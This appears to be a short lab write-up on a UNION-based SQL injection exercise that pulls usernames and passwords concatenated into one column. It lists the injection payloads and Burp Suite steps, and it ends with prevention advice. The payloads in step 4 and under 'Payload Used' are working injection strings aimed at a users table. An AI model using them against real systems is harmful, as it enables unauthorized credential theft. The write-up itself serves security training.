# 🔐 Lab 10: Retrieving Multiple Values in a Single Column

## 🧩 Objective
To retrive multiples values(username and password) in a single column using a UNION based SQL injection attack.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection in the product category parameter, allowing attackers to manipulate queries and extract data.

## ⚙️ Payload Used
- ' ORDER BY 3--
- ' UNION SELECT NULL, 'a'--
- ' UNION SELECT NULL, version()--
- ' UNION SELECT NULL, username || ' : ' || password FROM users-- 

## 🔎 Analysis
1. only one column is available for output
2. Find which database sever we are using
3. Use concatenation operator to combaine the multiple values
4. Extract the username and password together
   
## 🚀 Steps to Reproduce
1. Navigate to the product category page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater  
4. Modify the parameter with:
   ' UNION SELECT username || ':' || password FROM users--  
5. Send the request  
6. Observe combined output in the response  

## ✅ Result
Successfully retrieved usernames and passwords combined in a single column.

## 🧠 Key Learning
When limited to a single columns, concatenation allows extraction of multiple values field in one output.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement strict input validation  
- Avoid exposing database query results  
- Apply least privilege to database access  

---

## 📸 Screenshots

<img width="1354" height="674" alt="LAB10_1" src="https://github.com/user-attachments/assets/eadbf5b7-5351-4fae-b3fd-e87a83d92c18" />
<br><br>

**Figure 1: Identifying single column output scenario**

<br><br>

<img width="1340" height="666" alt="LAB10_2" src="https://github.com/user-attachments/assets/21638e8b-9aab-43c5-b022-e3595aa73a44" />
<br><br>

**Figure 2: Finding database server for the correct useage of syntex**

<br><br>

<img width="1308" height="674" alt="LAB10_3" src="https://github.com/user-attachments/assets/a87bdd6f-dd32-4f2a-a69d-8d54f6e28372" />
<br><br>

**Figure 3: Displaying combined output (username:password)**

<br><br>

<img width="1360" height="681" alt="LAB10_5" src="https://github.com/user-attachments/assets/34a82a2e-05a1-44b8-aded-db6abf31e647" />
<br><br>

**Figure 4: Union Injection payload in Burp suite repeater and extractiong user data**

<br><br>
<img width="1346" height="660" alt="LAB10_4" src="https://github.com/user-attachments/assets/e2dbdc85-8d5b-4eef-b888-da55d5b036f0" />
<br><br>

**Figure 5: Successful extraction using single column (Lab Solved)**
